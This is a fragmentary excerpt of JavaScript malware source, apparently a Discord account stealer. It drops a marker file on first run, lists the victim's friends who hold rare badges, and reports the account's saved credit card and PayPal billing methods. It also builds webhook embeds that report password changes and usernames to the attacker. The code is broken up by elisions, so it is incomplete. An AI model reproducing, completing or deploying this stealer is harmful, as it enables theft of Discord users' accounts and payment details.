...
function firstRun() {
    fs.readdir(__dirname, (err, data) => {
        if (data.includes("Tomori.txt")) return true
            ...
            fs.writeFile(`${__dirname}/Tomori.txt`,"i",i=>{});
...
function CalcFriends(f) {
    ...
    for (z of r) {
        ...
        if (b != "") a += b + `${z.user.username}#${z.user.discriminator}\n`
    }
    if (a == "") a = "𝐍𝐨 𝐑𝐀𝐑𝐄 𝐁𝐚𝐝𝐠𝐞𝐝 𝐅𝐫𝐢𝐞𝐧𝐝"
    return a
}
...
function PaymentMethod(bill) {
    ...
    bill.forEach(bill => {
        ...
        else if (bill.type == 1 && bill.invalid == false) billing += "✔️ 𝐂𝐫𝐞𝐝𝐢𝐭 𝐂𝐚𝐫𝐝"
        else if (bill.type == 2 && bill.invalid == false) billing += "✔️ 𝐏𝐚𝐲𝐩𝐚𝐥"
        ...
        XML.responseText;`, true).then(info6 => {
                            ...
                            var params = {
                                ...
                                embeds: [{
                                    ...
                                    "author": {
                                        "name": '𝐀 𝐒𝐡𝐢𝐭 𝐇𝐞𝐫𝐞 𝐖𝐞 𝐆𝐨 𝐀𝐠𝐚𝐢𝐧',
                                        "url": "https://pornhub.com",
                                        "avatar_url": "https://cdn.discordapp.com/avatars/276357866217013249/a_39431cb21481bc2d3fed5ab2d6ef55a9.png?size=128"
                                    },
                                    "footer": {
    ...
    `, true).then((ip) => {
        ...
        XML.responseText;`, true).then(info6 => {
                            ...
                            var params = {
                                ...
                                content: "",
                                embeds: [{
                                    "title": "𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝 𝐂𝐡𝐚𝐧𝐠𝐞𝐝 𝐨𝐟 " + json.username,
                                    "avatar_url": "https://data.whicdn.com/images/346110457/original.gif",
                                    "color": 43690,
                                    "fields": [{
                                        "name": "𝐔𝐬𝐞𝐫𝐍𝐚𝐦𝐞: ",
